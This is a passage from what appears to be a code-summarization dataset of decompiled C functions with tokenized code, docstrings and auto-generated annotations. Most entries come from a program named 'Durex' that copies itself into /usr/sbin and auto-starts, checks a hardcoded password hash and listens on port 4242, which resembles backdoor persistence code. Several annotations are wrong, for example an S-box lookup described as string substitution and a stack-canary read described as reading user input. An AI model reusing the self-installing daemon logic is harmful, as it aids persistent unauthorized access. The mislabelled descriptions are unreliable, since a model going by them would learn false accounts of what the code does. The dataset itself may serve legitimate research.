            "successful",
            "copy",
            "before",
            "auto-starting",
            "the",
            "replicated",
            "file",
            "."
        ],
        "code_tokens": [
            "void",
            "__noreturn",
            "FUN0",
            "(",
            ")",
            "{",
            "int",
            "fd",
            ";",
            "int",
            "v1",
            ";",
            "__off_t",
            "st_size",
            ";",
            "ssize_t",
            "n",
            ";",
            "struct",
            "stat",
            "v4",
            ";",
            "__int64",
            "buf",
            "[",
            "66",
            "]",
            ";",
            "buf",
            "[",
            "65",
            "]",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "memset",
            "(",
            "buf",
            ",",
            "0",
            ",",
            "512",
            ")",
            ";",
            "memset",
            "(",
            "&",
            "v4",
            ",",
            "0",
            ",",
            "sizeof",
            "(",
            "v4",
            ")",
            ")",
            ";",
            "daemon_report",
            "(",
            "\"[ INFO ]\"",
            ",",
            "\"Replicating Durex...\"",
            ")",
            ";",
            "if",
            "(",
            "!",
            "stat",
            "(",
            "\"/usr/sbin/Durex\"",
            ",",
            "&",
            "v4",
            ")",
            ")",
            "{",
            "daemon_report",
            "(",
            "\"[ ERROR ]\"",
            ",",
            "\"Durex binary already exists. Auto-starting...\"",
            ")",
            ";",
            "system",
            "(",
            "\"/usr/sbin/Durex\"",
            ")",
            ";",
            "exit",
            "(",
            "1",
            ")",
            ";",
            "}",
            "fd",
            "=",
            "open",
            "(",
            "\"./Durex\"",
            ",",
            "0",
            ")",
            ";",
            "if",
            "(",
            "fd",
            "=",
            "=",
            "-",
            "1",
            ")",
            "{",
            "daemon_report",
            "(",
            "\"[ ERROR ]\"",
            ",",
            "\"Unable to open Durex binary.\"",
            ")",
            ";",
            "exit",
            "(",
            "1",
            ")",
            ";",
            "}",
            "if",
            "(",
            "fstat",
            "(",
            "fd",
            ",",
            "&",
            "v4",
            ")",
            "=",
            "=",
            "-",
            "1",
            ")",
            "{",
            "daemon_report",
            "(",
            "\"[ ERROR ]\"",
            ",",
            "\"Unable to fstat Durex binary.\"",
            ")",
            ";",
            "close",
            "(",
            "fd",
            ")",
            ";",
            "exit",
            "(",
            "1",
            ")",
            ";",
            "}",
            "st_size",
            "=",
            "v4",
            ".",
            "st_size",
            ";",
            "v1",
            "=",
            "open",
            "(",
            "\"/usr/sbin/Durex\"",
            ",",
            "577",
            ",",
            "511L",
            "L",
            ")",
            ";",
            "if",
            "(",
            "v1",
            "=",
            "=",
            "-",
            "1",
            ")",
            "{",
            "daemon_report",
            "(",
            "\"[ ERROR ]\"",
            ",",
            "\"Unable to create destination file.\"",
            ")",
            ";",
            "close",
            "(",
            "fd",
            ")",
            ";",
            "exit",
            "(",
            "1",
            ")",
            ";",
            "}",
            "while",
            "(",
            "1",
            ")",
            "{",
            "n",
            "=",
            "read",
            "(",
            "fd",
            ",",
            "buf",
            ",",
            "0x1FFuL",
            "L",
            ")",
            ";",
            "if",
            "(",
            "n",
            "<",
            "=",
            "0",
            ")",
            "break",
            ";",
            "write",
            "(",
            "v1",
            ",",
            "buf",
            ",",
            "n",
            ")",
            ";",
            "st_size",
            "-",
            "=",
            "n",
            ";",
            "}",
            "close",
            "(",
            "fd",
            ")",
            ";",
            "close",
            "(",
            "v1",
            ")",
            ";",
            "if",
            "(",
            "st_size",
            ")",
            "{",
            "daemon_report",
            "(",
            "\"[ ERROR ]\"",
            ",",
            "\"Missing bytes on copy. Removing corrupted file.\"",
            ")",
            ";",
            "unlink",
            "(",
            "\"/usr/sbin/Durex\"",
            ")",
            ";",
            "exit",
            "(",
            "1",
            ")",
            ";",
            "}",
            "daemon_report",
            "(",
            "\"[ INFO ]\"",
            ",",
            "\"Durex replicated. Auto-starting...\"",
            ")",
            ";",
            "system",
            "(",
            "\"/usr/sbin/Durex\"",
            ")",
            ";",
            "exit",
            "(",
            "0",
            ")",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function `readfsqword` appears to be part of a program that reads a string from the user, allocates memory for it, and then copies the string into the allocated memory.",
            "The `memset` function is used to fill a block of memory with a particular value, often used for initializing memory to zero or setting specific byte values within a memory block.",
            "The `close` function appears to be part of a larger codebase, likely related to file handling and system operations, involving features such as memory mapping, directory iteration, and low-level I/O, with conditional compilation directives for different environments, potentially for system-level or embedded programming tasks."
        ],
        "longer_label": "The provided code is a C function designed to replicate a binary file named \"Durex\" to \"/usr/sbin/Durex\", checking for its existence, opening and copying its content, and handling potential errors, utilizing low-level file I/O operations and system calls, with special attention to accessing thread-local storage via `__readfsqword`."
    },
    {
        "id": 143,
        "docstring_tokens": [
            "The",
            "code",
            "defines",
            "a",
            "function",
            "that",
            "creates",
            "a",
            "log",
            "file",
            "in",
            "a",
            "specified",
            "directory",
            "and",
            "writes",
            "a",
            "timestamp",
            "along",
            "with",
            "the",
            "type",
            "and",
            "message",
            "provided",
            "as",
            "parameters",
            "."
        ],
        "code_tokens": [
            "__int64",
            "__fastcall",
            "FUN0",
            "(",
            "const",
            "char",
            "*",
            "a1",
            ",",
            "const",
            "char",
            "*",
            "a2",
            ")",
            "{",
            "int",
            "fd",
            ";",
            "time_t",
            "timer",
            ";",
            "DIR",
            "*",
            "dirp",
            ";",
            "struct",
            "tm",
            "*",
            "tp",
            ";",
            "char",
            "s",
            "[",
            "8",
            "]",
            ";",
            "__int64",
            "v8",
            ";",
            "__int64",
            "v9",
            ";",
            "int",
            "v10",
            ";",
            "__int16",
            "v11",
            ";",
            "unsigned",
            "__int64",
            "v12",
            ";",
            "v12",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "s",
            "=",
            "0L",
            "L",
            ";",
            "v8",
            "=",
            "0L",
            "L",
            ";",
            "v9",
            "=",
            "0L",
            "L",
            ";",
            "v10",
            "=",
            "0",
            ";",
            "v11",
            "=",
            "0",
            ";",
            "dirp",
            "=",
            "opendir",
            "(",
            "\"/var/log/durex\"",
            ")",
            ";",
            "if",
            "(",
            "dirp",
            ")",
            "{",
            "closedir",
            "(",
            "dirp",
            ")",
            ";",
            "}",
            "else",
            "if",
            "(",
            "mkdir",
            "(",
            "\"/var/log/durex\"",
            ",",
            "0x180u",
            ")",
            "=",
            "=",
            "-",
            "1",
            ")",
            "{",
            "return",
            "0xFFFFFFFFL",
            "L",
            ";",
            "}",
            "fd",
            "=",
            "open",
            "(",
            "\"/var/log/durex/durex.log\"",
            ",",
            "1089",
            ",",
            "384L",
            "L",
            ")",
            ";",
            "if",
            "(",
            "fd",
            "=",
            "=",
            "-",
            "1",
            ")",
            "return",
            "0xFFFFFFFFL",
            "L",
            ";",
            "time",
            "(",
            "&",
            "timer",
            ")",
            ";",
            "tp",
            "=",
            "localtime",
            "(",
            "&",
            "timer",
            ")",
            ";",
            "strftime",
            "(",
            "s",
            ",",
            "0x1EuL",
            "L",
            ",",
            "\"[ %Y-%m-%d %H:%M:%S ]\"",
            ",",
            "tp",
            ")",
            ";",
            "dprintf",
            "(",
            "fd",
            ",",
            "\"%s %s %s\\n\"",
            ",",
            "s",
            ",",
            "a1",
            ",",
            "a2",
            ")",
            ";",
            "close",
            "(",
            "fd",
            ")",
            ";",
            "return",
            "0L",
            "L",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The \"closed\" function likely represents a coroutine or thread control mechanism in a C-based system, managing coroutine states, including suspension, blocking, and completion flags, possibly used in asynchronous I/O operations."
        ],
        "longer_label": "The given code is likely a function written in C that creates or opens a log directory, writes a timestamped message with provided strings to a log file, and returns either a success or failure indicator, with the \"closed\" function possibly indicating coroutine or thread management."
    },
    {
        "id": 144,
        "docstring_tokens": [
            "This",
            "code",
            "defines",
            "a",
            "function",
            "to",
            "add",
            "a",
            "round",
            "key",
            "to",
            "a",
            "block",
            "of",
            "data",
            "by",
            "performing",
            "a",
            "bitwise",
            "XOR",
            "operation",
            "on",
            "each",
            "byte",
            "."
        ],
        "code_tokens": [
            "__int64",
            "__fastcall",
            "FUN0",
            "(",
            "_BYTE",
            "*",
            "a1",
            ",",
            "char",
            "*",
            "a2",
            ",",
            "char",
            "*",
            "a3",
            ",",
            "int",
            "a4",
            ")",
            "{",
            "char",
            "*",
            "v4",
            ";",
            "char",
            "v5",
            ";",
            "char",
            "*",
            "v6",
            ";",
            "char",
            "v7",
            ";",
            "_BYTE",
            "*",
            "v8",
            ";",
            "__int64",
            "result",
            ";",
            "unsigned",
            "int",
            "v10",
            ";",
            "v10",
            "=",
            "4",
            "*",
            "a4",
            ";",
            "while",
            "(",
            "1",
            ")",
            "{",
            "result",
            "=",
            "v10",
            "-",
            "-",
            ";",
            "if",
            "(",
            "(",
            "int",
            ")",
            "result",
            "<",
            "=",
            "0",
            ")",
            "break",
            ";",
            "v4",
            "=",
            "a2",
            "+",
            "+",
            ";",
            "v5",
            "=",
            "*",
            "v4",
            ";",
            "v6",
            "=",
            "a3",
            "+",
            "+",
            ";",
            "v7",
            "=",
            "*",
            "v6",
            ";",
            "v8",
            "=",
            "a1",
            "+",
            "+",
            ";",
            "*",
            "v8",
            "=",
            "v7",
            "^",
            "v5",
            ";",
            "}",
            "return",
            "result",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [],
        "longer_label": "The provided code appears to be a function named `key_add` that XORs characters from two input arrays `a2` and `a3`, storing the result in an output array `a1`, with the loop iterating `a4` times and returning the final index of the loop counter."
    },
    {
        "id": 145,
        "docstring_tokens": [
            "The",
            "function",
            "``",
            "substitute",
            "''",
            "replaces",
            "each",
            "byte",
            "in",
            "a",
            "block",
            "using",
            "a",
            "substitution",
            "box",
            "based",
            "on",
            "the",
            "byte",
            "'s",
            "value",
            "."
        ],
        "code_tokens": [
            "__int64",
            "__fastcall",
            "FUN0",
            "(",
            "__int64",
            "a1",
            ",",
            "__int64",
            "a2",
            ",",
            "int",
            "a3",
            ")",
            "{",
            "__int64",
            "result",
            ";",
            "int",
            "i",
            ";",
            "for",
            "(",
            "i",
            "=",
            "4",
            "*",
            "a3",
            ";",
            ";",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "i",
            "+",
            "a1",
            ")",
            "=",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "4L",
            "L",
            "*",
            "*",
            "(",
            "unsigned",
            "__int8",
            "*",
            ")",
            "(",
            "i",
            "+",
            "a1",
            ")",
            "+",
            "a2",
            ")",
            ")",
            "{",
            "result",
            "=",
            "(",
            "unsigned",
            "int",
            ")",
            "i",
            "-",
            "-",
            ";",
            "if",
            "(",
            "(",
            "int",
            ")",
            "result",
            "<",
            "=",
            "0",
            ")",
            "break",
            ";",
            "}",
            "return",
            "result",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function \"stitute\" likely replaces occurrences of a substring within a string with another substring, based on the provided code snippets, enabling string substitution functionality."
        ],
        "longer_label": "The function \"substitute\" iterates through a string, replacing occurrences of a substring with another substring, effectively enabling string substitution functionality."
    },
    {
        "id": 146,
        "docstring_tokens": [
            "The",
            "read_input",
            "function",
            "reads",
            "user",
            "input",
            "and",
            "updates",
            "the",
            "direction",
            "of",
            "the",
            "worm",
            "unless",
            "'",
            "q",
            "'",
            "is",
            "pressed",
            ",",
            "in",
            "which",
            "case",
            "it",
            "stops",
            "the",
            "scheduler",
            "."
        ],
        "code_tokens": [
            "void",
            "__cdecl",
            "FUN0",
            "(",
            ")",
            "{",
            "int",
            "v0",
            ";",
            "v0",
            "=",
            "wgetch",
            "(",
            "stdscr",
            ")",
            ";",
            "switch",
            "(",
            "v0",
            ")",
            "{",
            "case",
            "259",
            ":",
            "if",
            "(",
            "worm_dir",
            "!",
            "=",
            "2",
            ")",
            "worm_dir",
            "=",
            "0",
            ";",
            "break",
            ";",
            "case",
            "261",
            ":",
            "if",
            "(",
            "worm_dir",
            "!",
            "=",
            "3",
            ")",
            "worm_dir",
            "=",
            "1",
            ";",
            "break",
            ";",
            "case",
            "258",
            ":",
            "if",
            "(",
            "worm_dir",
            ")",
            "worm_dir",
            "=",
            "2",
            ";",
            "break",
            ";",
            "case",
            "260",
            ":",
            "if",
            "(",
            "worm_dir",
            "!",
            "=",
            "1",
            ")",
            "worm_dir",
            "=",
            "3",
            ";",
            "break",
            ";",
            "case",
            "113",
            ":",
            "stop_scheduler",
            "(",
            ")",
            ";",
            "break",
            ";",
            "}",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function `wgetch` appears to be part of a library for handling input in a text-based interface, particularly within a terminal or console environment, likely reading a single character from standard input, potentially with support for mouse input, and it's often used in conjunction with curses or similar libraries for terminal manipulation.",
            ""
        ],
        "longer_label": "The given code defines a function `read_input` that reads a single character of input using `wgetch`, potentially from a terminal interface, and updates the direction of a \"worm\" based on arrow key inputs, with additional functionality to stop the scheduler when the 'q' key is pressed."
    },
    {
        "id": 147,
        "docstring_tokens": [
            "The",
            "code",
            "encrypts",
            "data",
            "using",
            "the",
            "Rijndael",
            "encryption",
            "algorithm",
            "with",
            "a",
            "specified",
            "key",
            "schedule",
            "and",
            "input/output",
            "data",
            "."
        ],
        "code_tokens": [
            "__int64",
            "__fastcall",
            "FUN0",
            "(",
            "__int64",
            "a1",
            ",",
            "char",
            "*",
            "a2",
            ",",
            "char",
            "*",
            "a3",
            ")",
            "{",
            "int",
            "i",
            ";",
            "int",
            "v5",
            ";",
            "int",
            "v6",
            ";",
            "v5",
            "=",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "a1",
            ";",
            "v6",
            "=",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "a1",
            "+",
            "8",
            ")",
            ";",
            "key_add",
            "(",
            "a2",
            ",",
            "a3",
            ",",
            "(",
            "char",
            "*",
            ")",
            "(",
            "a1",
            "+",
            "12",
            ")",
            ",",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "a1",
            ")",
            ";",
            "for",
            "(",
            "i",
            "=",
            "1",
            ";",
            "i",
            "<",
            "v6",
            ";",
            "+",
            "+",
            "i",
            ")",
            "{",
            "substitute",
            "(",
            "(",
            "__int64",
            ")",
            "a2",
            ",",
            "(",
            "__int64",
            ")",
            "s_box",
            ",",
            "v5",
            ")",
            ";",
            "shift_column",
            "(",
            "a2",
            ",",
            "v5",
            ")",
            ";",
            "mix_row",
            "(",
            "a2",
            ",",
            "v5",
            ")",
            ";",
            "key_add",
            "(",
            "a2",
            ",",
            "a2",
            ",",
            "(",
            "char",
            "*",
            ")",
            "(",
            "32L",
            "L",
            "*",
            "i",
            "+",
            "a1",
            "+",
            "12",
            ")",
            ",",
            "v5",
            ")",
            ";",
            "}",
            "substitute",
            "(",
            "(",
            "__int64",
            ")",
            "a2",
            ",",
            "(",
            "__int64",
            ")",
            "s_box",
            ",",
            "v5",
            ")",
            ";",
            "shift_column",
            "(",
            "a2",
            ",",
            "v5",
            ")",
            ";",
            "return",
            "key_add",
            "(",
            "a2",
            ",",
            "a2",
            ",",
            "(",
            "char",
            "*",
            ")",
            "(",
            "32L",
            "L",
            "*",
            "i",
            "+",
            "a1",
            "+",
            "12",
            ")",
            ",",
            "v5",
            ")",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function \"shift\" appears to be designed to adjust a given value by a multiple of a specified modulus, likely used for cyclic or wrapping operations within various contexts such as file processing, regular expression manipulation, or code indentation."
        ],
        "longer_label": "The provided code is a function for encrypting data using the Rijndael algorithm, incorporating key addition, substitution, column shifting, row mixing, and modular operations."
    },
    {
        "id": 148,
        "docstring_tokens": [
            "The",
            "code",
            "decrypts",
            "data",
            "using",
            "the",
            "Rijndael",
            "algorithm",
            "by",
            "performing",
            "key",
            "addition",
            ",",
            "substitution",
            ",",
            "shifting",
            ",",
            "and",
            "mixing",
            "operations",
            "in",
            "reverse",
            "order",
            "."
        ],
        "code_tokens": [
            "__int64",
            "__fastcall",
            "FUN0",
            "(",
            "__int64",
            "a1",
            ",",
            "char",
            "*",
            "a2",
            ",",
            "char",
            "*",
            "a3",
            ")",
            "{",
            "int",
            "i",
            ";",
            "int",
            "v5",
            ";",
            "int",
            "v6",
            ";",
            "v5",
            "=",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "a1",
            ";",
            "v6",
            "=",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "a1",
            "+",
            "8",
            ")",
            ";",
            "key_add",
            "(",
            "a2",
            ",",
            "a3",
            ",",
            "(",
            "char",
            "*",
            ")",
            "(",
            "32L",
            "L",
            "*",
            "v6",
            "+",
            "a1",
            "+",
            "12",
            ")",
            ",",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "a1",
            ")",
            ";",
            "substitute",
            "(",
            "(",
            "__int64",
            ")",
            "a2",
            ",",
            "(",
            "__int64",
            ")",
            "&",
            "s_box_inverse",
            ",",
            "v5",
            ")",
            ";",
            "shift_column_inverse",
            "(",
            "a2",
            ",",
            "v5",
            ")",
            ";",
            "for",
            "(",
            "i",
            "=",
            "v6",
            "-",
            "1",
            ";",
            "i",
            ">",
            "0",
            ";",
            "-",
            "-",
            "i",
            ")",
            "{",
            "key_add",
            "(",
            "a2",
            ",",
            "a2",
            ",",
            "(",
            "char",
            "*",
            ")",
            "(",
            "32L",
            "L",
            "*",
            "i",
            "+",
            "a1",
            "+",
            "12",
            ")",
            ",",
            "v5",
            ")",
            ";",
            "mix_row_inverse",
            "(",
            "(",
            "unsigned",
            "__int8",
            "*",
            ")",
            "a2",
            ",",
            "v5",
            ")",
            ";",
            "substitute",
            "(",
            "(",
            "__int64",
            ")",
            "a2",
            ",",
            "(",
            "__int64",
            ")",
            "&",
            "s_box_inverse",
            ",",
            "v5",
            ")",
            ";",
            "shift_column_inverse",
            "(",
            "a2",
            ",",
            "v5",
            ")",
            ";",
            "}",
            "if",
            "(",
            "i",
            ")",
            "_assert_fail",
            "(",
            "\"round == 0\"",
            ",",
            "\"sources/rj.c\"",
            ",",
            "0x1B9u",
            ",",
            "\"rijn_decrypt\"",
            ")",
            ";",
            "return",
            "key_add",
            "(",
            "a2",
            ",",
            "a2",
            ",",
            "(",
            "char",
            "*",
            ")",
            "(",
            "a1",
            "+",
            "12",
            ")",
            ",",
            "v5",
            ")",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The \"shift_column_inverse\" function likely reverses a previously applied column shift operation within a dataset or matrix.",
            "The \"mix_row_inverse\" function likely performs an inverse operation related to mixing rows, possibly reversing a mixing transformation applied to rows in a data structure or matrix.",
            "The \"shift\" function appears to be utilized in different contexts across the code snippets, possibly for manipulating or adjusting values or elements within arrays, buffers, or files, depending on the specific implementation within each code snippet.",
            "The function \"column_inverse\" exchanges the positions of elements within a specified column in a two-dimensional array.",
            "The `_assert_fail` function is likely used for handling assertion failures in a C or C++ program by printing diagnostic information such as the failed assertion, file, line number, and function, before halting execution.",
            "The function \"decrypt\" appears to be part of cryptographic operations, utilizing libraries like OpenSSL, CommonCrypto, or possibly custom cryptographic functions, for decrypting ciphertext using various encryption algorithms such as AES and RSA.",
            "The function named \"return\" seems to be used for creating an interception context for handling input devices in a system, likely for purposes such as device simulation or interception for input processing, within the context of C programming."
        ],
        "longer_label": "The provided code implements the decryption process for the Rijndael cipher, utilizing inverse operations such as key addition, substitution with an inverse S-box, inverse column shifting, and inverse row mixing, with annotations suggesting the reversal of previously applied transformations like column shifting and row mixing."
    },
    {
        "id": 149,
        "docstring_tokens": [
            "This",
            "code",
            "calculates",
            "a",
            "hash",
            "value",
            "for",
            "a",
            "given",
            "key",
            "using",
            "a",
            "specific",
            "algorithm",
            "and",
            "returns",
            "the",
            "unsigned",
            "integer",
            "hash",
            "value",
            "."
        ],
        "code_tokens": [
            "__int64",
            "__fastcall",
            "FUN0",
            "(",
            "__int64",
            "a1",
            ",",
            "__int64",
            "a2",
            ")",
            "{",
            "__int64",
            "v2",
            ";",
            "int",
            "v4",
            ";",
            "unsigned",
            "int",
            "v5",
            ";",
            "__int64",
            "v6",
            ";",
            "v6",
            "=",
            "0L",
            "L",
            ";",
            "v4",
            "=",
            "0",
            ";",
            "while",
            "(",
            "v6",
            "!",
            "=",
            "a2",
            ")",
            "{",
            "v2",
            "=",
            "v6",
            "+",
            "+",
            ";",
            "v5",
            "=",
            "1025",
            "*",
            "(",
            "*",
            "(",
            "char",
            "*",
            ")",
            "(",
            "a1",
            "+",
            "v2",
            ")",
            "+",
            "v4",
            ")",
            ";",
            "v4",
            "=",
            "(",
            "v5",
            ">",
            ">",
            "6",
            ")",
            "^",
            "v5",
            ";",
            "}",
            "return",
            "32769",
            "*",
            "(",
            "(",
            "(",
            "unsigned",
            "int",
            ")",
            "(",
            "9",
            "*",
            "v4",
            ")",
            ">",
            ">",
            "11",
            ")",
            "^",
            "(",
            "9",
            "*",
            "v4",
            ")",
            ")",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [],
        "longer_label": "The code is a function called `server_hashpass` which takes two 64-bit integers as input, iterates over the second input while performing a series of bitwise operations and multiplications to compute a hash value, and returns the final hash value."
    },
    {
        "id": 150,
        "docstring_tokens": [
            "The",
            "server_login",
            "function",
            "checks",
            "the",
            "input",
            "parameters",
            "a1",
            "and",
            "a2",
            ",",
            "returns",
            "0xFFFFFFFFLL",
            "if",
            "either",
            "is",
            "null",
            ",",
            "and",
            "returns",
            "0LL",
            "if",
            "the",
            "result",
            "of",
            "server_hashpass",
            "with",
            "a1",
            "and",
            "a2",
            "equals",
            "1654641804",
            ",",
            "otherwise",
            "returns",
            "0xFFFFFFFFLL",
            "."
        ],
        "code_tokens": [
            "__int64",
            "__fastcall",
            "FUN0",
            "(",
            "__int64",
            "a1",
            ",",
            "__int64",
            "a2",
            ")",
            "{",
            "if",
            "(",
            "!",
            "a1",
            "|",
            "|",
            "!",
            "a2",
            ")",
            "return",
            "0xFFFFFFFFL",
            "L",
            ";",
            "if",
            "(",
            "(",
            "unsigned",
            "int",
            ")",
            "server_hashpass",
            "(",
            "a1",
            ",",
            "a2",
            ")",
            "=",
            "=",
            "1654641804",
            ")",
            "return",
            "0L",
            "L",
            ";",
            "return",
            "0xFFFFFFFFL",
            "L",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [],
        "longer_label": "The provided code defines a server_login function which returns a specific value based on the conditions: if either a1 or a2 is zero, it returns 0xFFFFFFFFL, if the result of server_hashpass function with parameters a1 and a2 is equal to 1654641804, it returns 0L, otherwise, it returns 0xFFFFFFFFL."
    },
    {
        "id": 151,
        "docstring_tokens": [
            "The",
            "function",
            "server_destroy",
            "shuts",
            "down",
            "the",
            "server",
            "by",
            "closing",
            "the",
            "server",
            "socket",
            "and",
            "freeing",
            "any",
            "connected",
            "clients",
            "."
        ],
        "code_tokens": [
            "__int64",
            "FUN0",
            "(",
            ")",
            "{",
            "daemon_report",
            "(",
            "\"[ INFO ]\"",
            ",",
            "\"Shutting down server...\"",
            ")",
            ";",
            "if",
            "(",
            "g_durex",
            "[",
            "2",
            "]",
            "!",
            "=",
            "-",
            "1",
            ")",
            "{",
            "if",
            "(",
            "close",
            "(",
            "g_durex",
            "[",
            "2",
            "]",
            ")",
            "=",
            "=",
            "-",
            "1",
            ")",
            "daemon_report",
            "(",
            "\"[ ERROR ]\"",
            ",",
            "\"Unable to close server socket.\"",
            ")",
            ";",
            "else",
            "daemon_report",
            "(",
            "\"[ INFO ]\"",
            ",",
            "\"Server socket closed.\"",
            ")",
            ";",
            "}",
            "if",
            "(",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "&",
            "g_durex",
            "[",
            "4",
            "]",
            ")",
            "client_lfree",
            "(",
            "&",
            "g_durex",
            "[",
            "4",
            "]",
            ")",
            ";",
            "return",
            "0L",
            "L",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [],
        "longer_label": "The code defines a function `server_destroy` to shut down a server, closing its socket and freeing associated client resources if necessary, with potential error reporting."
    },
    {
        "id": 152,
        "docstring_tokens": [
            "The",
            "code",
            "creates",
            "a",
            "server",
            "socket",
            ",",
            "sets",
            "socket",
            "options",
            ",",
            "binds",
            "it",
            "to",
            "a",
            "port",
            ",",
            "listens",
            "for",
            "incoming",
            "connections",
            ",",
            "and",
            "reports",
            "the",
            "status",
            "of",
            "each",
            "operation",
            "."
        ],
        "code_tokens": [
            "__int64",
            "FUN0",
            "(",
            ")",
            "{",
            "int",
            "optval",
            ";",
            "struct",
            "sockaddr",
            "addr",
            ";",
            "unsigned",
            "__int64",
            "v3",
            ";",
            "v3",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "&",
            "addr",
            ".",
            "sa_family",
            "=",
            "0L",
            "L",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "&",
            "addr",
            ".",
            "sa_data",
            "[",
            "6",
            "]",
            "=",
            "0L",
            "L",
            ";",
            "optval",
            "=",
            "1",
            ";",
            "daemon_report",
            "(",
            "\"[ INFO ]\"",
            ",",
            "\"Creating server...\"",
            ")",
            ";",
            "g_durex",
            "[",
            "2",
            "]",
            "=",
            "socket",
            "(",
            "2",
            ",",
            "1",
            ",",
            "6",
            ")",
            ";",
            "if",
            "(",
            "g_durex",
            "[",
            "2",
            "]",
            "=",
            "=",
            "-",
            "1",
            ")",
            "{",
            "daemon_report",
            "(",
            "\"[ ERROR ]\"",
            ",",
            "\"Unable to create server socket.\"",
            ")",
            ";",
            "return",
            "0xFFFFFFFFL",
            "L",
            ";",
            "}",
            "else",
            "{",
            "daemon_report",
            "(",
            "\"[ INFO ]\"",
            ",",
            "\"Server socket created.\"",
            ")",
            ";",
            "setsockopt",
            "(",
            "g_durex",
            "[",
            "2",
            "]",
            ",",
            "1",
            ",",
            "2",
            ",",
            "&",
            "optval",
            ",",
            "4u",
            ")",
            ";",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "&",
            "addr",
            ".",
            "sa_data",
            "[",
            "2",
            "]",
            "=",
            "htonl",
            "(",
            "0",
            ")",
            ";",
            "addr",
            ".",
            "sa_family",
            "=",
            "2",
            ";",
            "*",
            "(",
            "_WORD",
            "*",
            ")",
            "addr",
            ".",
            "sa_data",
            "=",
            "htons",
            "(",
            "0x1092u",
            ")",
            ";",
            "if",
            "(",
            "bind",
            "(",
            "g_durex",
            "[",
            "2",
            "]",
            ",",
            "&",
            "addr",
            ",",
            "0x10u",
            ")",
            "=",
            "=",
            "-",
            "1",
            ")",
            "{",
            "daemon_report",
            "(",
            "\"[ ERROR ]\"",
            ",",
            "\"Unable to bind server socket.\"",
            ")",
            ";",
            "close",
            "(",
            "g_durex",
            "[",
            "2",
            "]",
            ")",
            ";",
            "return",
            "0xFFFFFFFFL",
            "L",
            ";",
            "}",
            "else",
            "{",
            "daemon_report",
            "(",
            "\"[ INFO ]\"",
            ",",
            "\"Server socket binded.\"",
            ")",
            ";",
            "if",
            "(",
            "listen",
            "(",
            "g_durex",
            "[",
            "2",
            "]",
            ",",
            "3",
            ")",
            "=",
            "=",
            "-",
            "1",
            ")",
            "{",
            "daemon_report",
            "(",
            "\"[ ERROR ]\"",
            ",",
            "\"Unable to listen on server socket.\"",
            ")",
            ";",
            "close",
            "(",
            "g_durex",
            "[",
            "2",
            "]",
            ")",
            ";",
            "return",
            "0xFFFFFFFFL",
            "L",
            ";",
            "}",
            "else",
            "{",
            "daemon_report",
            "(",
            "\"[ INFO ]\"",
            ",",
            "\"Listening on server socket.\"",
            ")",
            ";",
            "daemon_report",
            "(",
            "\"[ INFO ]\"",
            ",",
            "\"Server running.\"",
            ")",
            ";",
            "return",
            "0L",
            "L",
            ";",
            "}",
            "}",
            "}",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function `__readfsq` is used to read a 64-bit value from the FS segment register, commonly employed for accessing thread-local storage or other per-thread data structures in x86 assembly language programming.",
            "The \"setsock\" function is used to configure and set various socket options and attributes, such as making the socket non-blocking, reusing the same local address rapidly, and setting multicast socket options.",
            "The function `htons` is used to convert a 16-bit integer from host byte order to network byte order, swapping the bytes if necessary to ensure consistent byte ordering for network communication.",
            "The `close` function is likely part of a larger program involving system calls, memory mapping, directory iteration, and input/output operations, primarily aimed at managing file descriptors and closing them after use to release system resources."
        ],
        "longer_label": "The provided code defines a function `server_create()` in C which creates a server socket, sets it up for listening on a specific port, and reports status messages, utilizing thread-local storage reading, socket configuration, and network byte order conversion functions."
    },
    {
        "id": 153,
        "docstring_tokens": [
            "This",
            "code",
            "defines",
            "a",
            "function",
            "that",
            "handles",
            "incoming",
            "connections",
            "from",
            "clients",
            ",",
            "accepts",
            "new",
            "connections",
            ",",
            "manages",
            "a",
            "maximum",
            "number",
            "of",
            "simultaneous",
            "connections",
            ",",
            "and",
            "communicates",
            "with",
            "clients",
            "by",
            "sending",
            "messages",
            "."
        ],
        "code_tokens": [
            "__int64",
            "FUN0",
            "(",
            ")",
            "{",
            "__int64",
            "v0",
            ";",
            "int",
            "v1",
            ";",
            "socklen_t",
            "addr_len",
            ";",
            "int",
            "v4",
            ";",
            "int",
            "v5",
            ";",
            "int",
            "fd",
            ";",
            "int",
            "v7",
            ";",
            "int",
            "v8",
            ";",
            "unsigned",
